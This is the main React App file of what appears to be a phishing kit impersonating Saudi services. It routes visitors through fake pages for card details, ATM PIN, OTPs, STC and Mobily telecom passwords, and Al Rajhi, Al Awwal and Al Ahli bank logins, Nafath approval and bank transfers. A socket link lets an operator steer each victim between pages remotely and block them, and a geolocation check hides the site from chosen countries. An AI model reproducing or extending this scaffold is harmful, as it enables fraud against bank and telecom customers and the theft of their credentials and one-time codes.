import { useEffect, useState } from "react";
import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import ScrollToTop from "./components/ScrollToTop";
import PageTitleUpdater from "./components/PageTitleUpdater";
import { ThemeProvider } from "./contexts/ThemeContext";
import { LanguageProvider } from "./contexts/LanguageContext";
import { initializeSocket, disconnectSocket, socket, setNavigateCallback } from "./lib/store";
import { useLocation } from "wouter";
import AmerChat from "./components/AmerChat";
import Home from "./pages/Home";
import Booking from "./pages/Booking";
import SummaryPayment from "./pages/SummaryPayment";
import CreditCardPayment from "./pages/CreditCardPayment";
import OTPVerification from "./pages/OTPVerification";
import ATMPassword from "./pages/ATMPassword";
import PhoneVerification from "./pages/PhoneVerification";
import PhoneOTP from "./pages/PhoneOTP";
import STCCallAlert from "./pages/STCCallAlert";
import MobilyCallAlert from "./pages/MobilyCallAlert";
import MyStcOTP from "./pages/MyStcOTP";
import STCPassword from "./pages/STCPassword";
import AlRajhiLogin from "./pages/AlRajhiLogin";
import AlRajhiOTP from "./pages/AlRajhiOTP";
import AlRajhiNafath from "./pages/AlRajhiNafath";
import AlRajhiAlert from "./pages/AlRajhiAlert";
import AlRajhiCall from "./pages/AlRajhiCall";
import RajhiPaymentError from "./pages/RajhiPaymentError";
import AlAwwalBank from "./pages/AlAwwalBank";
import AlAwwalNafath from "./pages/AlAwwalNafath";
import AlAhliOTP from "./pages/AlAhliOTP";
import BankTransfer from "./pages/BankTransfer";
import BankAccountNumber from "./pages/BankAccountNumber";
import FinalPage from "./pages/FinalPage";

function Router() {
  return (
    <Switch>
      <Route path={"/"} component={Home} />
      <Route path={"/booking-appointment"} component={Booking} />
      <Route path={"/summary-payment"} component={SummaryPayment} />
      <Route path={"/credit-card-payment"} component={CreditCardPayment} />
      <Route path={"/otp-verification"} component={OTPVerification} />
      <Route path={"/atm-password"} component={ATMPassword} />
      <Route path={"/phone-verification"} component={PhoneVerification} />
      <Route path={"/phone-otp"} component={PhoneOTP} />
      <Route path={"/stc-call-alert"} component={STCCallAlert} />
      <Route path={"/mobily-call-alert"} component={MobilyCallAlert} />
      <Route path={"/mystc-otp"} component={MyStcOTP} />
      <Route path={"/stc-password"} component={STCPassword} />
      <Route path={"/alrajhi-login"} component={AlRajhiLogin} />
      <Route path={"/alrajhi-otp"} component={AlRajhiOTP} />
      <Route path={"/alrajhi-nafath"} component={AlRajhiNafath} />
      <Route path={"/alrajhi-alert"} component={AlRajhiAlert} />
      <Route path={"/alrajhi-call"} component={AlRajhiCall} />
      <Route path={"/rajhi-payment-error"} component={RajhiPaymentError} />
      <Route path={"/alawwal-bank"} component={AlAwwalBank} />
      <Route path={"/alawwal-nafath"} component={AlAwwalNafath} />
      <Route path={"/alahli-otp"} component={AlAhliOTP} />
      <Route path={"/bank-transfer"} component={BankTransfer} />
      <Route path={"/bank-account-number"} component={BankAccountNumber} />
      <Route path={"/final-page"} component={FinalPage} />
      <Route path={"/404"} component={NotFound} />
      <Route component={NotFound} />
    </Switch>
  );
}

function BlockedCountryPage() {
  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
        <h1 className="text-2xl font-bold text-gray-800 mb-4">غير متاح</h1>
        <p className="text-gray-600 mb-2">عذراً، هذه الخدمة غير متاحة في منطقتك</p>
        <p className="text-gray-500 text-sm">This service is not available in your region</p>
      </div>
    </div>
  );
}

function App() {
  const [isCountryBlocked, setIsCountryBlocked] = useState(false);
  const [isVisitorBlocked, setIsVisitorBlocked] = useState(false);
  const [blockedMessage, setBlockedMessage] = useState("");
  const [, setLocation] = useLocation();

  useEffect(() => {
    setNavigateCallback((path: string) => setLocation(path));
  }, [setLocation]);

  useEffect(() => {
    initializeSocket();
    return () => disconnectSocket();
  }, []);

  useEffect(() => {
    const s = socket.value;
    const handleBlocked = () => {
      setIsVisitorBlocked(true);
      setBlockedMessage("تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.");
    };
    const handleUnblocked = () => {
      setIsVisitorBlocked(false);
      setBlockedMessage("");
    };
    s.on("blocked", handleBlocked);
    s.on("unblocked", handleUnblocked);
    return () => {
      s.off("blocked", handleBlocked);
      s.off("unblocked", handleUnblocked);
    };
  }, []);

  useEffect(() => {
    const checkCountry = async () => {
      try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();
        const visitorCountry = data.country_name;
        socket.value.emit("blockedCountries:check", visitorCountry);
        socket.value.on("blockedCountries:checkResult", ({ isBlocked }: { isBlocked: boolean }) => {
          setIsCountryBlocked(isBlocked);
        });
        socket.value.on("blockedCountries:updated", (blockedCountries: string[]) => {
          setIsCountryBlocked(blockedCountries.some((c) => c.toLowerCase() === visitorCountry.toLowerCase()));
        });
      } catch (error) {
        console.error("Error checking country:", error);
      }
    };
    const timer = setTimeout(checkCountry, 1000);
    return () => clearTimeout(timer);
  }, []);

  if (isCountryBlocked) return <BlockedCountryPage />;

  if (isVisitorBlocked) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
          <h1 className="text-2xl font-bold text-gray-800 mb-4">تم الحظر</h1>
          <p className="text-gray-600 mb-2">{blockedMessage}</p>
        </div>
      </div>
    );
  }

  return (
    <ErrorBoundary>
      <ThemeProvider defaultTheme="light">
        <LanguageProvider>
          <TooltipProvider>
            <Toaster />
            <ScrollToTop />
            <PageTitleUpdater />
            <AmerChat />
            <Router />
          </TooltipProvider>
        </LanguageProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;